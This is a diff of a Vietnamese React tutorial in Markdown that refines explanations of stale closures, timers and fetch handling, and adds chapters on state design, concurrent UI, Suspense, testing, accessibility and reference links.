-**Giải thích cặn kẽ vì sao:** vì dependency array là `[]`, `useEffect` chỉ chạy **đúng một lần** ngay khi component mount — tại thời điểm đó, hàm callback bên trong `setInterval` được tạo ra và nó "đóng gói" (closure) giá trị `count` lúc đó, tức là `0`. Interval này chạy mãi mãi với **cùng một hàm callback đó** — nó không bao giờ được tạo lại, nên nó không bao giờ "biết" `count` đã đổi thành 1 ở lần sau. Mỗi giây nó vẫn tính `0 + 1 = 1` rồi gọi `setCount(1)` — React thấy giá trị mới (1) giống hệt giá trị đang lưu (đã là 1 từ lần đầu) nên không re-render nữa, và giá trị hiển thị đứng yên ở 1.
+**Giải thích cặn kẽ vì sao:** Effect này đăng ký callback ở render có `count = 0`. Interval giữ callback đó, nên mỗi giây nó vẫn tính `0 + 1` và yêu cầu `setCount(1)`. Render sau có snapshot khác, nhưng callback cũ không tự đổi theo snapshot mới. Sau lần đầu, React nhận lại cùng giá trị `1`, nên màn hình đứng ở 1.
 
 **Cách sửa 1 — functional update (đơn giản nhất):**
 
@@ -1203,7 +1199,9 @@ useEffect(() => {
 function Counter() {
   const [count, setCount] = useState(0);
   const countRef = useRef(count);
-  countRef.current = count; // luôn đồng bộ ref với state mới nhất sau mỗi render
+  // Ghi ref trong render chỉ phù hợp khi giá trị này không tham gia output UI.
+  // Đừng dùng nó như cách đồng bộ mặc định sau render.
+  countRef.current = count;
 
   useEffect(() => {
     const id = setInterval(() => {
@@ -1313,14 +1311,22 @@ function Stopwatch() {
   const intervalRef = useRef(null); // lưu id của setInterval
 
   const start = () => {
+    if (intervalRef.current !== null) return; // không tạo interval trùng
     intervalRef.current = setInterval(() => {
       setTime(prev => prev + 1);
     }, 1000);
   };
 
   const stop = () => {
-    clearInterval(intervalRef.current); // truy cập id để hủy
+    if (intervalRef.current !== null) {
+      clearInterval(intervalRef.current);
+      intervalRef.current = null;
+    }
   };
+
+  useEffect(() => () => {
+    if (intervalRef.current !== null) clearInterval(intervalRef.current);
+  }, []); // giải phóng timer nếu component bị gỡ
 
   return (
     <div>
@@ -1508,8 +1514,14 @@ function useFetch(url) {
     dispatch({ isLoading: true, error: null });
 
     fetch(url)
-      .then(r => r.json())
-      .then(data => { if (!cancelled) dispatch({ data, isLoading: false }); })
+      .then(r => {
+        if (!r.ok) throw new Error(`HTTP ${r.status}`);
+        return r.json();
+      })
+      .then(data => {
+        if (!data || typeof data !== 'object') throw new Error('Dữ liệu trả về không đúng cấu trúc mong đợi');
+        if (!cancelled) dispatch({ data, isLoading: false });
+      })
       .catch(error => { if (!cancelled) dispatch({ error, isLoading: false }); });
 
     return () => { cancelled = true; };
@@ -1537,6 +1549,7 @@ function PostList({ authorId }) {
 
 ---
 
+<!-- content-id: shared-state -->
 ## 7. Kiến Trúc Dữ Liệu Và Quản Lý State Toàn Cục
 
 Quản lý một biến `count` trong 1 component là chuyện nhỏ. Nhưng khi dữ liệu (ví dụ thông tin user đăng nhập) cần dùng ở nhiều component nằm rải rác trong cây UI (Navbar, Sidebar, trang Profile...), bài toán tổ chức state trở nên phức tạp hơn nhiều.
@@ -1802,6 +1815,7 @@ export const store = configureStore({
 
 **Điểm quan trọng cần hiểu đúng ở bản RTK:** dòng `state.items.push(...)` hay `item.price *= ...` trông như đang mutate (sửa trực tiếp) state — điều mà Redux gốc vốn cấm kỵ (đúng như bug ở ví dụ "trước Redux" phần 7.3 phía trên). Nhưng RTK dùng thư viện **Immer** ở phía sau: nó cho phép bạn *viết* code như đang mutate trực tiếp (dễ đọc, ít lỗi thao tác spread sai cấp), nhưng Immer sẽ tự động tạo ra một **bản sao mới immutable** phía sau hậu trường — bạn được lợi cả về cú pháp gọn lẫn tính đúng đắn, mà không cần tự nhớ quy tắc "luôn spread" như bản Redux truyền thống.
 
+<!-- content-id: async-thunk-race -->
 ### 7.4. `createAsyncThunk` — xử lý bất đồng bộ với Redux
 
 Gọi API trong Redux cần xử lý 3 trạng thái: đang tải, thành công, thất bại. `createAsyncThunk` tự động sinh ra 3 action tương ứng (`pending`, `fulfilled`, `rejected`) để bạn xử lý trong `extraReducers`:
@@ -1822,21 +1836,26 @@ export const fetchUser = createAsyncThunk(
 
 const authSlice = createSlice({
   name: 'auth',
-  initialState: { user: null, isLoading: false, error: null },
+  initialState: { user: null, isLoading: false, error: null, currentRequestId: null },
   reducers: {},
   extraReducers: (builder) => {
     builder
-      .addCase(fetchUser.pending, (state) => {
+      .addCase(fetchUser.pending, (state, action) => {
         state.isLoading = true;
         state.error = null;
+        state.currentRequestId = action.meta.requestId;
       })
       .addCase(fetchUser.fulfilled, (state, action) => {
+        if (state.currentRequestId !== action.meta.requestId) return;
         state.isLoading = false;
         state.user = action.payload;
+        state.currentRequestId = null;
       })
       .addCase(fetchUser.rejected, (state, action) => {
+        if (state.currentRequestId !== action.meta.requestId) return;
         state.isLoading = false;
         state.error = action.error.message;
+        state.currentRequestId = null;
       });
   },
 });
@@ -1852,7 +1871,7 @@ function UserPage({ userId }) {
 
   useEffect(() => {
     dispatch(fetchUser(userId));
-  }, [userId]);
+  }, [dispatch, userId]);
 
   if (isLoading) return <p>Đang tải...</p>;
   if (error) return <p>Lỗi: {error}</p>;
@@ -1860,7 +1879,7 @@ function UserPage({ userId }) {
 }
 ```
 
-So sánh với cách tự quản lý `isLoading`/`error` bằng `useState` rời rạc (phần 6.2): `createAsyncThunk` gom toàn bộ logic 3 trạng thái vào đúng một chỗ trong `extraReducers`, không component nào cần tự `try/catch` hay tự set loading — nhất quán hoàn toàn trên toàn ứng dụng.
+So sánh với cách tự quản lý `isLoading`/`error` bằng `useState` rời rạc (phần 6.2): `createAsyncThunk` chuẩn hóa vòng đời `pending`/`fulfilled`/`rejected` trong `extraReducers`. Component vẫn quyết định lúc dispatch; với request có thể chồng chéo, reducer cần dùng `requestId` (như ví dụ trên), khóa cache hoặc cancellation để response cũ không ghi đè response mới.
 
 ---
 
@@ -1888,36 +1907,153 @@ luồng dữ liệu                             nhiều nơi đọc + ghi cùng 
 ---
 
 
+<!-- content-id: state-design -->
+## 8. Thiết Kế State, Form Và Dữ Liệu Server
+
+### 8.1. Chọn nơi ở cho state bằng câu hỏi
+
+Trước khi chọn `useState`, Context hay store, trả lời bốn câu hỏi:
+
+| Câu hỏi | Hướng đi |
+|---|---|
+| Giá trị có suy ra được từ props/state khác không? | Tính khi render, không tạo state dư thừa. |
+| Chỉ một component dùng nó không? | Local state gần nơi tương tác. |
+| URL có cần lưu/chia sẻ/khôi phục nó không? | Đưa một representation ổn định vào URL. |
+| Đây là dữ liệu từ server có cache, stale, retry không? | Xem như server state; thiết kế key, cache và invalidation. |
+
+Ví dụ ở Explorer: `currentChapterId` là URL state; kết quả tìm kiếm suy ra từ `query + index`; trạng thái menu mobile là local UI state; nội dung tải từ API là server state. Không có thư viện nào là “bậc tiếp theo” bắt buộc của `useState`.
+
+### 8.2. Controlled và uncontrolled form
+
+Input controlled nhận `value` từ React state và báo thay đổi qua `onChange`. Cách này dễ đồng bộ validation, preview và nhiều input với nhau.
+
+```jsx
+function EmailField() {
+  const [email, setEmail] = useState('');
+  const valid = email.includes('@'); // giá trị suy ra, không cần state riêng
+
+  return (
+    <label>
+      Email
+      <input value={email} onChange={event => setEmail(event.target.value)} />
+      {!valid && email && <span role="alert">Email chưa hợp lệ</span>}
+    </label>
+  );
+}
+```
+
+Input uncontrolled để DOM giữ giá trị (`defaultValue`, `ref`) thường hợp lý khi tích hợp form cũ hoặc chỉ cần đọc giá trị lúc submit. “Controlled” và “uncontrolled” là mô tả thiết kế, không phải hai cấp độ tốt/xấu.
+
+### 8.3. Server state không chỉ là `useEffect`
+
+Một request có thể có loading, HTTP error, dữ liệu sai cấu trúc, retry, cache, invalidation và race. Với ứng dụng nhỏ, bạn có thể quản lý rõ các trạng thái này bằng hook; khi nhu cầu cache/subscription tăng, dùng công cụ server-state phù hợp. Đừng sao chép kết quả fetch sang nhiều state cục bộ nếu chưa có lý do.
+
+Checklist cho một resource:
+
+1. Key nào nhận diện dữ liệu? Ví dụ `['user', userId]`.
+2. Response cũ có được phép ghi đè key hiện tại không?
+3. Khi nào dữ liệu stale và khi nào cần invalidation?
+4. UI nào hiển thị loading, empty, error và retry?
+
+<!-- content-id: concurrent-ui -->
+## 9. Concurrent UI, Suspense Và Ranh Giới Lỗi
+
+### 9.1. Urgent update và transition
+
+Không đưa giá trị điều khiển input vào transition: người dùng cần thấy ký tự ngay. Nhưng danh sách kết quả tốn kém có thể cập nhật ở ưu tiên thấp hơn.
+
+```jsx
+function SearchPage({ items }) {
+  const [query, setQuery] = useState('');
+  const [isPending, startTransition] = useTransition();
+  const [filter, setFilter] = useState('');
+
+  function handleChange(event) {
+    const next = event.target.value;
+    setQuery(next); // urgent: input phản hồi ngay
+    startTransition(() => setFilter(next)); // non-urgent: danh sách theo kịp sau
+  }
+
+  const visible = items.filter(item => item.name.includes(filter));
+  return <><input value={query} onChange={handleChange} />{isPending && <span>Đang lọc…</span>}<Results items={visible} /></>;
+}
+```
+
+`useDeferredValue` phù hợp khi bạn nhận một value từ props/hook và muốn phần UI nặng dùng phiên bản chậm hơn. Cả hai API là công cụ trải nghiệm; chúng không sửa một vòng lặp JavaScript nặng đang chặn main thread.
+
+### 9.2. Suspense có phạm vi cụ thể
+
+`<Suspense fallback={...}>` hiện fallback khi một child thực sự suspend, ví dụ component `lazy` hoặc Promise được đọc qua cơ chế hỗ trợ Suspense. Fetch nằm trong `useEffect` **không tự kích hoạt Suspense**.
+
+```jsx
+<Suspense fallback={<ProductListSkeleton />}>
+  <LazyProductList />
+</Suspense>
+```
+
+Đặt boundary gần phần có thể chậm để không thay toàn bộ trang bằng spinner. Kết hợp transition để giữ nội dung đã hiện khi cập nhật không khẩn cấp suspend lại.
+
+### 9.3. Error Boundary và retry
+
+Error Boundary hiển thị fallback cho lỗi render ở cây con. Nó không thay thế `try/catch` cho event handler hay xử lý lỗi request trong Effect.
+
+```jsx
+class ErrorBoundary extends React.Component {
+  state = { error: null };
+  static getDerivedStateFromError(error) { return { error }; }
+  render() {
+    if (this.state.error) return <button onClick={() => this.setState({ error: null })}>Thử lại phần này</button>;
+    return this.props.children;
+  }
+}
+```
+
+Mỗi màn hình cần quyết định boundary đặt ở đâu, fallback có giữ context nào và thao tác retry có tạo request/key mới hay không.
+
+<!-- content-id: quality-tooling -->
+## 10. Chất Lượng: Test, Accessibility Và Tooling
+
+### 10.1. Test hành vi người dùng
+
+Test nên kiểm tra điều người dùng thấy/làm thay vì chi tiết implementation. Với React Testing Library, render component, tương tác qua role/label, rồi kiểm tra kết quả nhìn thấy.
+
+```jsx
+render(<EmailField />);
+await user.type(screen.getByRole('textbox', { name: /email/i }), 'a@b.dev');
+expect(screen.queryByRole('alert')).not.toBeInTheDocument();
+```
+
+Tối thiểu có test cho: state chuyển đúng, request loading/error/success, race không ghi đè UI mới, cleanup timer/listener, và route/link mục nhỏ.
+
+### 10.2. Accessibility là một phần của thiết kế
+
+Ưu tiên HTML semantic, label thật cho input, focus nhìn thấy được, thao tác hoàn toàn bằng bàn phím, màu không là kênh thông tin duy nhất và thông báo thay đổi quan trọng bằng text/ARIA phù hợp. Kiểm tra tự động bằng axe hữu ích, nhưng không thay thế thử bàn phím và screen reader.
+
+### 10.3. Profiler, TypeScript và Compiler
+
+Chỉ tối ưu sau khi đo bằng React DevTools Profiler hoặc browser Performance. TypeScript mô tả contract của props/data; nó không thay test runtime cho response API. React Compiler là công cụ tối ưu tự động khi cấu hình hỗ trợ, không biến `useMemo`/`useCallback` thành điều kiện đúng đắn của logic.
+
+### 10.4. React lab — phòng lab cô lập
+
+Phòng lab ở dưới chạy React thật trong iframe sandbox, tách riêng khỏi mô hình giải thích. Nó chia thành **ba bài độc lập**: mỗi bài có một mục tiêu, thao tác cần làm và kết luận ngay bên cạnh kết quả. Bắt đầu ở Bài 1, không cần đoán thứ tự nút bấm. Nó cần mạng để tải React 19.2 từ CDN; kết quả quan sát được là bài kiểm chứng, không phải benchmark.
+
+<!-- content-id: knowledge-map -->
 ## Tổng Kết — Bản Đồ Kiến Thức
 
 ### Bạn đã đi qua những gì
 
 ```
-1. Bối cảnh          2. Triết lý           3. JSX & Biên dịch
-────────────         ─────────────         ──────────────────
-Vì sao React         Declarative           JSX → object JS
-ra đời:              Component-based       $$typeof Symbol
-- XSS               One-way Data Flow     Babel transform
-- Hiệu năng DOM      State vs Props
-- Bảo trì code
-
-4. Virtual DOM        5. Vòng đời           6. Hooks
-──────────────        ───────────           ────────
-VDOM + Recon-         Mounting/             useState
-ciliation            Updating/             useReducer
-Diffing O(n)         Unmounting            useEffect
-key heuristic        Class lifecycle       Stale Closure
-React Fiber          Function + Hooks      useRef
-Time Slicing                               useMemo
-                                           useCallback
-                                           Custom Hooks
-
-7. Quản lý State Toàn Cục
-──────────────────────────
-Lifting State Up → Prop Drilling (vấn đề)
-Context API → giải pháp nhẹ, phù hợp dữ liệu ít đổi
-Redux Toolkit → giải pháp mạnh, nhiều luồng dữ liệu phức tạp
-createAsyncThunk → xử lý async nhất quán
+0. JavaScript nền tảng → snapshot render, closure, async và bất biến
+1. Bối cảnh           → vì sao React tách dữ liệu, UI và DOM
+2. Triết lý           → declarative, component, one-way data flow
+3. JSX & an toàn      → JSX thành React element; dữ liệu được escape mặc định
+4. Render & commit    → reconciliation, key, Fiber và identity
+5. Vòng đời           → mount, update, cleanup và Strict Mode
+6. Hooks              → state, reducer, effect, ref, memo, custom hook
+7. State chia sẻ      → lifting state, Context, Redux Toolkit và async thunk
+8. State & dữ liệu    → form, URL state, server state, cache và race condition
+9. UI đồng thời       → transition, deferred value, Suspense, error boundary
+10. Chất lượng        → kiểm thử hành vi, accessibility, DevTools và TypeScript
 ```
 
 ### Mối liên hệ cốt lõi
@@ -1926,8 +2062,8 @@ createAsyncThunk → xử lý async nhất quán
 UI = f(state)                    ← triết lý nền tảng (chương 2)
      │
      ├─ state thay đổi           ← useState / useReducer (chương 6)
-     │   └─ React tính VDOM mới  ← Virtual DOM (chương 4)
-     │       └─ Diffing → Patch  ← Reconciliation (chương 4)
+     │   └─ React tính UI kế tiếp ← Render (chương 4)
+     │       └─ Commit nếu cần     ← Reconciliation (chương 4)
      │
      ├─ side effect              ← useEffect (chương 6)
      │   └─ gọi API, event...    ← cleanup / stale closure
@@ -1948,3 +2084,14 @@ Sau khi nắm vững nền tảng ở tài liệu này, các chủ đề nên h�
 | **TypeScript + React** | Type safety cho props, state, hooks — bắt buộc trong team/dự án thực |
 | **Testing (React Testing Library)** | Viết test cho component theo hành vi người dùng |
 | **Performance profiling** | React DevTools Profiler, Lighthouse — đo và tối ưu thực tế |
+
+### Nguồn tham khảo chính
+
+Các khẳng định về API React trong tài liệu nên được đối chiếu với tài liệu chính thức, vì chi tiết triển khai và khuyến nghị có thể thay đổi theo phiên bản:
+
+- [React — Render and Commit](https://react.dev/learn/render-and-commit), [Preserving and Resetting State](https://react.dev/learn/preserving-and-resetting-state), [Rendering Lists](https://react.dev/learn/rendering-lists).
+- [React — State as a Snapshot](https://react.dev/learn/state-as-a-snapshot), [Queueing a Series of State Updates](https://react.dev/learn/queueing-a-series-of-state-updates), [useEffect](https://react.dev/reference/react/useEffect), [useRef](https://react.dev/reference/react/useRef).
+- [React — memo](https://react.dev/reference/react/memo), [useMemo](https://react.dev/reference/react/useMemo), [Sharing State Between Components](https://react.dev/learn/sharing-state-between-components).
+- [Redux Toolkit — createAsyncThunk](https://redux-toolkit.js.org/api/createAsyncThunk), [WHATWG — Dynamic markup insertion](https://html.spec.whatwg.org/multipage/dynamic-markup-insertion.html), [web.dev — Rendering performance](https://web.dev/articles/rendering-performance).
+- [React — Choosing the State Structure](https://react.dev/learn/choosing-the-state-structure), [Managing State](https://react.dev/learn/managing-state), [Synchronizing with Effects](https://react.dev/learn/synchronizing-with-effects).
+- [React — useTransition](https://react.dev/reference/react/useTransition), [useDeferredValue](https://react.dev/reference/react/useDeferredValue), [Suspense](https://react.dev/reference/react/Suspense), [React Developer Tools](https://react.dev/learn/react-developer-tools).
